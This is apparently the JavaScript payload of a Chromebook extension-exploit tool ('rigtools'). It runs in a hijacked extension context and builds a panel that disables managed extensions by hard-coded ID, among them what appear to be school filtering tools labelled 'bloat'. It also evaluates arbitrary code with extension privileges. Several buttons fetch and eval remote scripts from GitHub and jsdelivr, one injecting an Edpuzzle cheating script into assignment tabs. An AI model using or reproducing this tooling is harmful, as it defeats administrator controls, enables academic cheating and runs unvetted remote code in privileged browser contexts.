onerror = alert;

const uiTemplate = `

`;
// if (chrome.fileManagerPrivate) {
// chrome.fileManagerPrivate.openURL();
// }
const managementTemplate = `

<div id="chrome_management_disable_ext">
<div class="header">
<img src="https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/main/images/XOsX.gif" alt="Rigtools Logo" class="logo"/>
<h1> chrome.management Disable Extensions </h1>
  </div>
<p class ="description">this funny was granted by the members of silly goober money gang</p>
<p class ="description">we love casting fun times</p>
<br/>
<button id="current-extension">Disable injected extension</button>
<button id="rmv-cmn-blt">Remove Bloat</button>
<button id="chii">Load Chii</button>
<button id="ed-hax">Edpuzzle hax</button>
<button id="swamp">Swamp</button>
<br/><br/>
<ul class="extlist">
</ul>
<!-- <input type="" class="extnum" /><button disabled id="toggler">Toggle extension</button>
<!-- <input type="text" class="extnum" /><button disabled id="toggler">Toggle extension</button>
<br/><br/> -->
<div style="height: 50px"></div>
</div>

`;
let savedExtList = [];
const slides = [];
let activeSlideIdx = 0;
const handleCallbacks_ = [];
const WAIT_FOR_FINISH = 1;
requestAnimationFrame(function a(t) {
  for (const cb of handleCallbacks_) {
    let m;
    if ((m = cb.f.apply(null, [t - cb.t]))) {
      if (m === 1) {
        return;
      } else {
        handleCallbacks_.splice(handleCallbacks_.indexOf(cb), 1);
      }
    }
  }
  requestAnimationFrame(a);
});
const handleInAnimationFrame = (cb, thiz = null, args = []) => {
  handleCallbacks_.push({
    f: cb,
    t: performance.now(),
  });
};

// class ExtensionCapabilities {
//   static setupSlides(activeidx = 0) {
//     if (chrome.management) {
//       slides.push(document.querySelector("#chrome_management_disable_ext"));
//     }
//     slides.push(document.querySelector("#ext_default"));
//     for (let i = 0; i < slides.length; i++) {
//       if (i === activeidx) {
//         slides[i].style.display = "block";
//       } else {
//         slides[i].style.display = "none";
//       }
//     }
//     activeSlideIdx = activeidx;

//     onkeydown = function (ev) {
//       if (ev.repeat) return;

//       if (this.getSelection() && this.getSelection().anchorNode.tagName) {
//         return;
//       }
//       if (ev.key.toLowerCase().includes("left")) {
//         activeSlideIdx--;
//         if (activeSlideIdx < 0) {
//           activeSlideIdx += slides.length;
//         }
//         activeSlideIdx %= slides.length;
//         ev.preventDefault();
//       }
//       if (ev.key.toLowerCase().includes("right")) {
//         activeSlideIdx++;
//         if (activeSlideIdx < 0) {
//           activeSlideIdx += slides.length;
//         }
//         activeSlideIdx %= slides.length;
//         ev.preventDefault();
//       }
//       ExtensionCapabilities.setActiveSlideIndex(activeSlideIdx);
//     };
//   }
//   static setActiveSlideIndex(idx) {
//     function a(t) {
//       const seconds = t / 1000;
//       if (seconds >= 0.2) {
//         // slides[i].style.display = "none";
//         return true;
//       }
//       slides[idx].style.opacity = String(seconds / 0.2);
//     }
//     for (let i = 0; i < slides.length; i++) {
//       if (i === idx) {
//         slides[i].style.display = "";
//       } else {
//         if (slides[i].style.display === "block") {
//           slides[i].style.position = "absolute";
//           const m = i;
//           handleInAnimationFrame(function (t) {
//             const seconds = t / 1000;
//             if (0.8 - seconds <= 0) {
//               slides[i].style.display = "none";
//               handleInAnimationFrame(a);
//               return true;
//             }
//             slides[i].style.opacity = String((0.2 - seconds) / 0.2);
//           });
//         }
//         // slides[i].style.display = "none";
//       }
//     }
//   }

//   activate() {}
// }
class DefaultExtensionCapabilities {
  static template = `
  <div id="ext_default">
  <div id="default_extension_capabilities">
  <div class="header">
<img src="https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/main/images/XOsX.gif" alt="Rigtools Logo" class="logo"/>
    <h1> Default Extension Capabilities </h1>
</div>
    <h2>Evaluate code</h1>
    <div class="container">
      <textarea id="code" placeholder=" Enter JavaScript to inject"></textarea>
    </div>
    <button id="code-run">Run</button>
    <div id="code-output"></div>
    
  </div>
  <div id="extension_tabs_default">
  <button id="tabreload">Refresh Tabs</button>
    <ul>
    
    </ul>
    <input id="TabURLInput" /> <button id="TabURLSubmit">Create</button>
    
  </div>
  </div>
  `; // TODO: Fix Navigator (For now I removed it)
  updateTabList() {
    if (this.disarmed) {
      return;
    }

    if (this.tabListInProgress) {
      console.log("In progress tablist building!");
      return;
    }
    this.tabListInProgress = true;

    const tablist = document.body.querySelector("#extension_tabs_default ul");

    tablist.innerHTML = "";
    const thiz = this;
    chrome.windows.getAll(function (win) {
      win.forEach(function (v) {
        chrome.tabs.query({ windowId: v.id }, function (tabInfos) {
          tabInfos.forEach(function (info) {
            const div = document.createElement("div");
            div.className = "tablist-item";
            div.innerHTML = `<img ${
              chrome.tabs && (info.favIconUrl?.length ?? 0) > 0
                ? `src="${info.favIconUrl}"`
                : ""
            }/><span class="tab-name">${info.title} (${info.url})</span>`;
            if (chrome.scripting) {
              const runButton = document.createElement("button");
              runButton.textContent = "Run";
              runButton.onclick = () => runCode(true, info.id);
              div.appendChild(runButton);
            }
            // const navButton = document.createElement("button");
            // navButton.className = "navigate";
            // navButton.textContent = "Navigate";
            const previewButton = document.createElement("button");
            previewButton.textContent = "Preview";

            // navButton.onclick = function (ev) {
            //   const inp = div.querySelector("input");
            //   chrome.tabs.update(info.id, {
            //     url: inp.value,
            //   });
            // };
            previewButton.onclick = () => {
              thiz.disarm = true;

              thiz.previewing = true;

              chrome.windows.update(
                info.windowId,
                {
                  focused: true,
                },
                function () {
                  chrome.tabs.update(info.id, { active: true });
                }
              );
              window.currentTimeout = setTimeout(function m() {
                clearTimeout(window.currentTimeout);

                chrome.tabs.getCurrent(function (tab) {
                  chrome.windows.update(
                    tab.windowId,
                    {
                      focused: true,
                    },
                    function () {
                      chrome.tabs.update(tab.id, { active: true });
                      thiz.disarm = false;
                      thiz.previewing = false;
                    }
                  );
                });
              }, 100);
            };

            // div.appendChild(navButton);
            div.appendChild(previewButton);
            tablist.appendChild(div);
          });
          thiz.tabListInProgress = false;
        });
      });
    });
  }
  activate() {
    document.body.insertAdjacentHTML(
      "beforeend",
      DefaultExtensionCapabilities.template
    );
    // document.close();
    document.body
      .querySelector("#ext_default")
      .querySelectorAll("button")
      .forEach(function (btn) {
        // alert("prepping button " + btn.id);
        btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
      }, this);

    this.updateTabList();
    for (let i in chrome.tabs) {
      if (i.startsWith("on")) {
        chrome.tabs[i].addListener(() => {
          this.updateTabList();
        });
      }
    }
    // document.body.querySelector('')
  }
  static getFS() {
    return new Promise(function (resolve) {
      webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve);
    });
  }
  /**
   * @param {HTMLButtonElement} b
   */
  async onBtnClick_(b) {
    switch (b.id) {
      case "code_evaluate": {
        console.log("Evaluating code!");
        const x = document.querySelector("#code_input").value;
        const fs = await DefaultExtensionCapabilities.getFS();
        function writeFile(file, data) {
          return new Promise((resolve, reject) => {
            fs.root.getFile(file, { create: true }, function (entry) {
              entry.remove(function () {
                fs.root.getFile(file, { create: true }, function (entry) {
                  entry.createWriter(function (writer) {
                    writer.write(new Blob([data]));
                    writer.onwriteend = resolve.bind(null, entry.toURL());
                  });
                });
              });
            });
          });
        }

        const url = await writeFile("src.js", x);
        let script =
          document.body.querySelector("#evaluate_elem") ??
          document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);
      }
      case "tabreload": {
        this.updateTabList();
      }
    }
  }
}
class HostPermissions {
  activate() {}
}
function createExtensionCard(name, id, enabled, icon_url) {
  const li = document.createElement("li");
  li.className = "extension-card";
  li.innerHTML = `
      <img class="extension-icon" src="${icon_url}"/>
      <span class="extension-name">${name} (${id})</span>
      <label class="toggle-switch">
          <input type="checkbox" ${enabled ? "checked" : ""}>
          <span class="slider"></span>
      </label>
  `;
  return li;
}
function updateExtensionStatus(extlist_element) {
  return new Promise(function (resolve, reject) {
    extlist_element.innerHTML = "";
    chrome.management.getAll(function (extlist) {
      const ordlist = [];
      let e = 0;
      extlist.forEach(function (e) {
        if (e.id === new URL(new URL(location.href).origin).host) {
          return;
        }
        ordlist.push(e);

        const icon = e.icons?.find((ic) => ic.size === 128) ?? e.icons?.at(-1);

        let card = createExtensionCard(
          e.name,
          e.id,
          e.enabled,
          icon?.url ||
            "https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/main/images/XOsX.gif"
        ); // add default image here

        let cardInput = card.querySelector("input");

        cardInput.addEventListener("change", (event) => {
          chrome.management.setEnabled(e.id, event.target.checked);
          // setTimeout(function () {
          //   updateExtensionStatus(extlist_element);
          // }, 200);
        });

        card.querySelector(".extension-icon").addEventListener("click", () => {
          cardInput.checked = !cardInput.checked;
          cardInput.dispatchEvent(new Event("change"));
        });

        // const itemElement = document.createElement("li");
        // itemElement.textContent = `${e.name} (${e.id}) `;
        // const aElem = document.createElement('a');
        // aElem.href = "javascript:void(0)";
        // aElem.innerText = `${e.enabled ? "enabled" : "disabled"}`;
        // aElem.onclick = function () {
        //   // alert(e.enabled);
        //   chrome.management.setEnabled(e.id, !e.enabled);
        //   setTimeout(function () {
        //     updateExtensionStatus(extlist_element);
        //   }, 200);
        // }
        // // e++;
        // itemElement.appendChild(aElem);
        extlist_element.appendChild(card);
        resolve();
      });
      savedExtList = ordlist;
    });
  });
}
const fileManagerPrivateTemplate = `
  <div id="fileManagerPrivate_cap">
    <div id="FMP_openURL">
      <button id="btn_FMP_openURL">Open URL in Skiovox window</button>
    </div>
  </div>

`;
const htmlStyle = `
    <style>
      body {
        font-family: monospace, sans-serif;
        background-color: #000000;
        color: #fff;
        margin: 0;
        padding: 20px;
      }

      body::-webkit-scrollbar {
        display: none;
      }

      #chrome_management_disable_ext {
        max-width: 800px;
        margin: 0 auto;
      }

      #ext_default {
        max-width: 1200px;
        margin: 0 auto;
      }

      h1 {
        font-size: 24px;
        margin-bottom: 20px;
      }

      .description {
        margin-bottom: 20px;
        color: #9aa0a6;
      }

      .extension-disabler {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background-color: #0a0a0a;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
      }

      ul {
        list-style-type: none;
        padding: 0;
        padding-bottom: 50px;
      }

      .extension-card {
      /*   background-color: #0a0a0a; */
        border: 2px solid #0a0a0a;
        margin-bottom: 10px;
        padding: 15px;
        border-radius: 8px;
        display: flex;
        justify-content: start;
        align-items: center;
      }

      .extension-card:has(input:checked) {
        background-color: #0a0a0a;
        border: 2px solid #0000;
      }

      .extension-icon {
        width: 32px;
        padding-right: 20px;
        cursor: pointer;
      }

      .extension-name {
        font-weight: bold;
      }

      .toggle-switch {
        margin-left: auto; 
        margin-right: 0;
        position: relative;
        display: inline-block;
        width: 60px;
        height: 36px;
      }

      .toggle-switch input {
        opacity: 0;
        width: 0;
        height: 0;
      }

      .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #0000;
        transition: .4s;
        border-radius: 34px;
        border: 2px solid #0a0a0a;
        
      }
      .header {
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .logo {
        width: 4em; /* Adjust this size as needed */
        height: auto;
        margin-right: 10px;
      }

      .slider:before {
        position: absolute;
        content: "";
        height: 26px;
        width: 26px;
        left: 4px;
        bottom: 4px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
      }

      input:checked+.slider {
        background-color: #a200ff;
        border: 2px solid #222;
      }

      input:checked+.slider:before {
        transform: translateX(24px);
      }

      .tablist-item {
        border: 2px solid #0a0a0a;
        margin-bottom: 10px;
        padding: 15px;
        border-radius: 8px;
        display: flex;
        justify-content: start;
        align-items: center;
      }
      
      .tablist-item img {
        max-width: 25px;
        margin-right: 10px;
      }

      .tablist-item span {
        padding: 10px, 0;
        text-overflow: ellipsis;
        width: 100%;
        white-space: nowrap;
        overflow: hidden;
        word-break: break-all;
        }
        
        .tablist-item span:hover{
          overflow: visible; 
          white-space: normal;
          height:auto;  
        }
        
        button {
        background-color: #810aff;
        color: white;
        border: none;
        padding: 9px 15px;
        text-align: center;
        border-radius: 5px;
        margin: 4px 2px;
        cursor: pointer;
        transition: background-color 0.3s;

        
        text-decoration: none;
        display: inline-block;
      }

      button:hover {
        background-color: #A324ED;
      }

      button:disabled {
        background-color: #cccccc;
        cursor: not-allowed;
      }

      #current-extension, #rmv-cmn-blt {
        background-color: #ff564a;
        font-family: Arial;
        font-size: medium;
        font-weight: bold;
      }
      #chii{
        background-color: #752bff;
        font-family: Arial;
        font-size: medium;
        font-weight: bold;
      }
      #chii:hover{
        background-color: #6525db;
      }
       #ed-hax{
        background-color: #ffce2e;
        font-family: Arial;
        font-size: medium;
        font-weight: bold;
      }
      #ed-hax:hover{
        background-color: #e3b622;
      }
      #swamp{
        background-color: #00a5df;
        font-family: Arial;
        font-size: medium;
        font-weight: bold;
      }
      #swamp:hover{
        background-color: #0084b3;
      }
      #current-extension:hover, #rmv-cmn-blt:hover {
        background-color: #e04338;
      }
      .container {
                  display: flex;
                  gap: 10px;
              }
      #code-run {
        align-self: flex-start;
        background-color: #810aff;
        color: white;
        border: none;
        cursor: pointer;
      }
      #code {
        background: #0a0a0a;
        color: white;
        width: 100%;
        min-height: 50px;
        height: 200px;
        resize: both;
        border: 1px solid #6f08ff;
        border-radius: 5px;
        font-family: Consolas;
      }
      .footer {
        position: fixed;
        bottom: 5px;
        right: 10px;
        color: #ffffff;
      }
      input[type='checkbox'] {
        accent-color: #6f08ff !important;
    }
    input[id='TabURLInput'] {
      background-color: #0a0a0a !important;
      border-color: #6f08ff !important;
      border-style: solid;
      border-radius: 3px;
  }
    </style>
  `;

onload = async function x() {
  let foundNothing = true;
  document.open();
  this.document.write(htmlStyle);
  document.close();
  if (chrome.fileManagerPrivate) {
    // alert(1);
    chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
    document.write(fileManagerPrivateTemplate);
    document.body.querySelector("#btn_FMP_openURL").onclick = function (ev) {};
  }
  if (chrome.management.setEnabled) {
    document.body.insertAdjacentHTML("beforeend", managementTemplate);
    // createStyleTag();
    const extlist_element = document.querySelector(".extlist");
    await updateExtensionStatus(extlist_element);
    const container_extensions = document.body.querySelector(
      "#chrome_management_disable_ext"
    );
    // alert("loading button");
    // alert(container_extensions.querySelector("button"));

    container_extensions.querySelector("#swamp").onclick = async function df(
      e
    ) {
      fetch(
        "https://raw.githubusercontent.com/T3M1N4L/rigtools-updated-ui/refs/heads/main/scripts/swamp-ultra.js"
      )
        .then((res) => res.text())
        .then(eval);
    };

    container_extensions.querySelector("#current-extension").onclick =
      async function df(e) {
        try {
          var grabidtokill = chrome.runtime.id;
          chrome.management.setEnabled(grabidtokill, false);
        } catch {
          alert("unsuccessful");
        }
      };

    container_extensions.querySelector("#rmv-cmn-blt").onclick =
      async function df(e) {
        try {
          const bloatIds = [
            "cgbbbjmgdpnifijconhamggjehlamcif",
            "lfkbbmclnpaihpaajhohhfdjelchkikf",
            "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
            "pohmgobdeajemcifpoldnnhffjnnkhgf",
            "becdplfalooflanipjoblcmpaekkbbhe",
            "feepmdlmhplaojabeoecaobfmibooaid",
            "adkcpkpghahmbopkjchobieckeoaoeem",
            "haldlgldplgnggkjaafhelgiaglafanh",
            "hpkdokakjglppeekfeekmebfahadnflp",
          ];

          bloatIds.forEach((id) => {
            chrome.runtime.getBackgroundPage(function (p) {
              p.chrome.management.setEnabled(id, false);
            });
          });
        } catch {
          alert("unsuccessful");
        }
      };
    container_extensions.querySelector("#chii").onclick = async function df(
      e
    ) {
      function listenerApp() {
        chrome.tabs.onUpdated.addListener((id) => {
          chrome.tabs.get(id, (tab) => {
            if (tab.status == "complete") {
              runChii(tab.id);
              // if (getDomain(tab.url) == "example.com") {
              //     runSomethingElse(tab.id);
              // }
            }
          });
        });
      }

      function runChii(tabid) {
        chii = `
          fetch("https://cdn.jsdelivr.net/npm/chii").then(res => res.text()).then((data) => {
              eval(data);
          });
          `;
        chrome.tabs.executeScript(tabid, { code: chii });
      }

      function getDomain(url, subdomain) {
        subdomain = subdomain || false;

        url = url.replace(/(https?:\/\/)?(www.)?/i, "");

        if (!subdomain) {
          url = url.split(".");

          url = url.slice(url.length - 2).join(".");
        }

        if (url.indexOf("/") !== -1) {
          return url.split("/")[0];
        }

        return url;
      }

      function main() {
        try {
          listenerApp();
        } catch (err) {
          alert(err);
        }
      }

      main();
    };

    container_extensions.querySelector("#ed-hax").onclick = async function df(
      e
    ) {
      function listenerApp() {
        chrome.tabs.onUpdated.addListener((id) => {
          chrome.tabs.get(id, (tab) => {
            if (tab.status == "complete") {
              if (tab.url.match(/edpuzzle\.com\/assignments/g)) {
                runEdpuzzle(tab.id);
              }
            }
          });
        });
      }

      function runEdpuzzle(tabid) {
        edpuzzle = `
fetch("https://cdn.jsdelivr.net/gh/Miner49ur/shorthand@main/edpuzzlingscript.js").then(r => r.text()).then(r => {
    if (!window.edpuzzlesLoaded) {
        eval(r);
        window.edpuzzlesLoaded = true;
    }
})
`;
        chrome.tabs.executeScript(tabid, { code: edpuzzle });
      }
      function main() {
        try {
          listenerApp();
        } catch (err) {
          alert(err);
        }
      }

      main();
    };
  }

  const otherFeatures = window.chrome.runtime.getManifest();
  const permissions = otherFeatures.permissions;

  new DefaultExtensionCapabilities().activate();
  document.body.insertAdjacentHTML(
    "beforeend",
    `<div class="footer"><strong> > ./T3RM1N4L</strong></div>`
  );

  document
    .querySelector("#code-run")
    .addEventListener("click", () => runCode(false));
};

const runCode = async (onTab, tabId = "") => {
  const codeTextarea = document.querySelector("#code");
  let code = codeTextarea.value;

  const outputDiv = document.querySelector("#code-output");

  if (onTab) {
    code = `chrome.scripting.executeScript({
      target: {tabId: ${tabId}},
      func: () => {${code}}
    });`;
  }

  try {
    const originalLog = console.log;
    console.log = (...args) => {
      outputDiv.innerHTML += args.join(" ") + "<br>";
    };

    const fs = await DefaultExtensionCapabilities.getFS();
    function writeFile(file, data) {
      return new Promise((resolve, reject) => {
        fs.root.getFile(file, { create: true }, function (entry) {
          entry.remove(function () {
            fs.root.getFile(file, { create: true }, function (entry) {
              entry.createWriter(function (writer) {
                writer.write(new Blob([data]));
                writer.onwriteend = resolve.bind(null, entry.toURL());
              });
            });
          });
        });
      });
    }

    const url = await writeFile("src.js", code);
    let script =
      document.body.querySelector("#evaluate_elem") ??
      document.createElement("script");
    script.remove();
    script = document.createElement("script");
    script.id = "evaluate_elem";
    script.src = url;
    document.body.appendChild(script);

    console.log = originalLog;
  } catch (error) {
    outputDiv.innerHTML = `Error: ${error}`;
  }
};
